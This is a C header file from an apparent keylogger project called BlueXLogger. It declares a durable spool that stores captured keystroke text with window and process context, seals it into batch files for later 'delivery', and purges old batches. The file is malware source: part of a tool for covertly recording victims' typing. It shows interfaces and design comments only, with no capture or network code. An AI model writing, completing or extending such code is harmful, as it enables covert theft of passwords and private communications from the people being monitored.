/*============================================================================
 * BlueXLogger - bxl_logbuf.h
 * Crash-safe append-only spool for captured keystroke text.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Durability model
 * ----------------
 * Captured text is appended to an on-disk spool file and flushed immediately.
 * Collection is a *rename*, not a truncate:
 *
 *     bxl_active.log  --rename-->  bxl_batch_<ts>_<seq>.log  +  fresh active
 *
 * A crash at any point therefore leaves every byte either in the active spool
 * or in a sealed batch file. On startup the sealed batches are re-enumerated
 * and re-queued, so nothing captured is ever lost to a restart.
 *==========================================================================*/
#ifndef BXL_LOGBUF_H
#define BXL_LOGBUF_H

#include "bxl_common.h"
#include "bxl_util.h"

#define BXL_BATCH_PREFIX   L"bxl_batch_"
#define BXL_ACTIVE_NAME    L"bxl_active.log"
#define BXL_MAX_BATCHES    256

typedef struct BxlLogBuf {
    wchar_t          dir[MAX_PATH * 2];
    wchar_t          active[MAX_PATH * 2];
    CRITICAL_SECTION cs;
    bxl_u32          seq;
    bxl_u32          entries;
    bxl_u64          bytes;
    int              ready;

    /* Context-change detection: a header is emitted only when the foreground
     * window actually changes, not per keystroke. */
    char             ctx_proc[128];
    char             ctx_title[512];
} BxlLogBuf;

/* Create the spool directory and open the active file. */
int  bxl_logbuf_init(BxlLogBuf *lb, const wchar_t *dir);
void bxl_logbuf_close(BxlLogBuf *lb);

/* Append raw bytes / text. Flushed to disk before returning. */
int  bxl_logbuf_append(BxlLogBuf *lb, const void *data, size_t len);
int  bxl_logbuf_append_text(BxlLogBuf *lb, const char *s);

/* Write a context header line if the foreground window changed.
 * Returns BXL_TRUE when a header was actually written. */
int  bxl_logbuf_note_context(BxlLogBuf *lb, const char *process,
                             const char *title, bxl_u64 unix_now);

/* Bytes currently spooled but not yet sealed. */
bxl_u64 bxl_logbuf_pending_bytes(BxlLogBuf *lb);
bxl_u32 bxl_logbuf_entry_count(BxlLogBuf *lb);

/* Seal the active spool into a batch file. On success batch_path receives the
 * full path and *bytes_out the size. Returns BXL_TRUE when a batch was made;
 * BXL_FALSE when there was nothing to seal. */
int  bxl_logbuf_seal(BxlLogBuf *lb, wchar_t *batch_path, size_t path_cch,
                     size_t *bytes_out);

/* List sealed batch files, oldest first. Returns the count found. */
int  bxl_logbuf_scan(BxlLogBuf *lb, wchar_t (*paths)[MAX_PATH * 2],
                     int max_paths);

/* Delete a sealed batch (after successful delivery). */
int  bxl_logbuf_delete_batch(const wchar_t *path);

/* Purge sealed batches older than age_days. */
int  bxl_logbuf_purge(BxlLogBuf *lb, bxl_u32 age_days, bxl_u32 *deleted_out);

#endif /* BXL_LOGBUF_H */
